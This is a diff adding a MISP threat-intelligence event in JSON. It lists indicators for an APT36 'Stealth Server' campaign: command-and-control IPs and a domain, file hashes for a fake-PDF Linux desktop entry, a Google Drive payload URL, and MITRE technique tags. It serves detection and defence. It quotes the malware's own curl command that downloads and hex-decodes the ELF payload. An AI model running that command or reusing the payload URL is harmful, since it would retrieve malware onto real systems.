@@ -1,0 +1,43 @@
+{
+  "Event": {
+    "date": "2025-08-21",
+    "threat_level_id": "1",
+    "info": "APT36: Stealth Server Campaign - Linux Desktop Entry and ELF Binary Infrastructure",
+    "published": false,
+    "attribute_count": "15",
+    "Attribute": [
+      {"type": "ip-dst", "category": "Network activity", "to_ids": true, "value": "5.178.0.29", "comment": "APT36 | Stealth Server C2 | Port 8080 | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "ip-dst", "category": "Network activity", "to_ids": true, "value": "161.97.82.97", "comment": "APT36 | Stealth Server C2 | Port 8080 | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "ip-dst", "category": "Network activity", "to_ids": true, "value": "164.215.103.55", "comment": "APT36 | Stealth Server C2 | Port 8080 | Reported in CloudSEK | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "ip-dst", "category": "Network activity", "to_ids": true, "value": "45.141.58.199", "comment": "APT36 | Stealth Server Administrative Panel | Port 4000 | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "domain", "category": "Network activity", "to_ids": true, "value": "discoverlive.site", "comment": "APT36 | C2 domain | Related to ASN: AS 213373 | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "url", "category": "Payload delivery", "to_ids": true, "value": "https://drive.google.com/uc?export=download&id=1bhQoBEO08KaH7YI2hHIUkdBYGsOr8WFV", "comment": "APT36 | ELF binary download URL | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "md5", "category": "Payload delivery", "to_ids": true, "value": "c1a1e6e2ef0694180b865df321f99471", "comment": "APT36 | Linux desktop entry file | Draft_RFI_for_PDS_10_Aug_25_Final.PDF | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "sha1", "category": "Payload delivery", "to_ids": true, "value": "ead2ee01d13f42bbfab331aa178f07d8c1290479", "comment": "APT36 | Linux desktop entry file | Draft_RFI_for_PDS_10_Aug_25_Final.PDF | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "sha256", "category": "Payload delivery", "to_ids": true, "value": "ab85924ba95692995ac622172ed7f2ebc1997450d86f5245b03491422be2f3d6", "comment": "APT36 | Linux desktop entry file | Draft_RFI_for_PDS_10_Aug_25_Final.PDF | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "md5", "category": "Payload delivery", "to_ids": true, "value": "84fa9ebb448b035917d1b87d52a49e62", "comment": "APT36 | ELF binary | Hex encoded | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "sha1", "category": "Payload delivery", "to_ids": true, "value": "6178f1b469af248fcd2408f7261c9fb6c8cdcf32", "comment": "APT36 | ELF binary | Hex encoded | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "sha256", "category": "Payload delivery", "to_ids": true, "value": "678c7f9ff4ef0f1dbe5a07885e244e8730f41e145256e1c17b5fdcd9892c8bb0", "comment": "APT36 | ELF binary | Hex encoded | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "email", "category": "Attribution", "to_ids": true, "value": "bulldark453@gmail.com", "comment": "APT36 | Uploader email address | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "text", "category": "Other", "to_ids": false, "value": "Stealth Server - Login", "comment": "APT36 | FOFA query for C2 discovery | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"},
+      {"type": "text", "category": "Other", "to_ids": false, "value": "curl ${cDPUvX} \"https://drive.google.com/uc?export=download&id=1bhQoBEO08KaH7YI2hHIUkdBYGsOr8WFV\" | xxd -r -p", "comment": "APT36 | Command line for ELF binary download | Source: Threat Intelligence", "first_seen": "2025-08-21", "last_seen": "2025-08-21"}
+    ],
+    "Tag": [
+      {"name": "tlp:amber"},
+      {"name": "type:OSINT"},
+      {"name": "misp:threat-level=\"high\""},
+      {"name": "misp-galaxy:threat-actor=\"APT36\""},
+      {"name": "misp-galaxy:country=\"Pakistan\""},
+      {"name": "misp-galaxy:malware=\"Stealth Server\""},
+      {"name": "misp-galaxy:tool=\"ELF Binary\""},
+      {"name": "misp-galaxy:tool=\"Linux Desktop Entry\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Web Protocols - T1071.001\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1566.001\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Command and Scripting Interpreter - T1059\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Acquire Infrastructure - Domains - T1583.001\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Compromise Infrastructure - Domains - T1584.001\""},
+      {"name": "misp-galaxy:mitre-attack-pattern=\"Establish Accounts - Email Accounts - T1585.002\""}
+    ]
+  }
+}
